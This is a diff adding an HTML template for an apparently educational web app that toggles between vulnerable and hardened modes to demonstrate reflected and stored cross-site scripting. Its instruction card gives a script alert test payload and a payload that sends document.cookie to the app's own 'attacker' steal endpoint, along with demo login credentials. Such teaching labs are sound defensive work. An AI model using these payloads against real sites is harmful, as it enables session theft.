@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cross-Site Scripting - Toggle10</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootswatch@5.3.3/dist/darkly/bootstrap.min.css" rel="stylesheet">
+    <link href="{{ url_for('static', filename='style.css') }}" rel="stylesheet">
+</head>
+<body>
+<nav class="navbar navbar-dark mb-4">
+    <div class="container">
+        <a class="navbar-brand" href="/">Toggle10</a>
+        <a class="btn btn-outline-light btn-sm me-auto" href="/"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16" height="16" class="me-1 align-text-bottom"><path d="M11.47 3.841a.75.75 0 0 1 1.06 0l8.69 8.69a.75.75 0 1 0 1.06-1.061l-8.689-8.69a2.25 2.25 0 0 0-3.182 0l-8.69 8.69a.75.75 0 1 0 1.061 1.06l8.69-8.689Z" /><path d="m12 5.432 8.159 8.159c.03.03.06.058.091.086v6.198c0 1.035-.84 1.875-1.875 1.875H15a.75.75 0 0 1-.75-.75v-4.5a.75.75 0 0 0-.75-.75h-3a.75.75 0 0 0-.75.75V21a.75.75 0 0 1-.75.75H5.625a1.875 1.875 0 0 1-1.875-1.875v-6.198a2.29 2.29 0 0 0 .091-.086L12 5.432Z" /></svg> Home</a>
+        <div>
+            {% if user %}
+                <span class="text-white me-2">Hello, {{ user }}</span>
+                <a class="btn btn-outline-danger btn-sm" href="/logout">Logout</a>
+            {% else %}
+                <a class="btn btn-primary btn-sm" href="/login">Login</a>
+            {% endif %}
+        </div>
+    </div>
+</nav>
+
+<div class="container">
+    <div class="alert {% if vulnerable %}alert-danger{% else %}alert-success{% endif %} d-flex justify-content-between align-items-center">
+        <span>Mode: <strong>{% if vulnerable %}Vulnerable{% else %}Hardened{% endif %}</strong></span>
+        {% if user %}
+            <button class="btn btn-dark btn-sm" id="mode-switch">Switch to {% if vulnerable %}Hardened{% else %}Vulnerable{% endif %}</button>
+        {% endif %}
+    </div>
+
+    <div class="card p-3 mb-3">
+        <form action="{{ url_for('xss.search_' ~ version) }}" method="get" target="_blank">
+            <label class="form-label">Search products</label>
+            <div class="input-group">
+                <input type="text" name="q" class="form-control">
+                <button type="submit" class="btn btn-primary">Search</button>
+            </div>
+        </form>
+    </div>
+
+    <div class="card p-3 mb-3">
+        <form action="{{ url_for('xss.reviews_' ~ version) }}" method="post" target="_blank">
+            <label class="form-label">Write a laptop review</label>
+            <textarea name="body" class="form-control mb-2" rows="2"></textarea>
+            <button type="submit" class="btn btn-primary">Post review</button>
+            <a class="btn btn-secondary" href="{{ url_for('xss.attacker_log') }}" target="_blank">Attacker log</a>
+        </form>
+    </div>
+
+    <div class="card p-3">
+        <h5>This is our Cross-Site Scripting demonstration! Steps to follow:</h5>
+        <ol class="mb-0">
+            <li>Log in as "alice" with the password "password123"</li>
+            <li>Type "&lt;script&gt;alert('xss')&lt;/script&gt;" in the search box and search... a new tab will open with the results</li>
+            <li>Vulnerable mode will run your text as code and show a popup, because the page prints whatever you type! Hardened mode will show your text as plain text, as it escapes special characters before displaying them</li>
+            <li>Next, type the same text in the review box and post it... vulnerable mode will show the popup every time the reviews page loads, because the review is saved and shown to every visitor! Meanwhile, hardened mode again shows plain text</li>
+            <li>Then, post "&lt;script&gt;new Image().src='/xss/attacker/steal?c='+document.cookie&lt;/script&gt;" as a review and click "Attacker log"... vulnerable mode will show your login cookie stolen! Hardened mode will keep the log empty, as your text is never run</li>
+            <li>Press the Switch button at the top and repeat steps 2, 4 and 5 to see the difference</li>
+        </ol>
+    </div>
+</div>
+<script src="{{ url_for('static', filename='walkthrough.js') }}"></script>
+</body>
+</html>
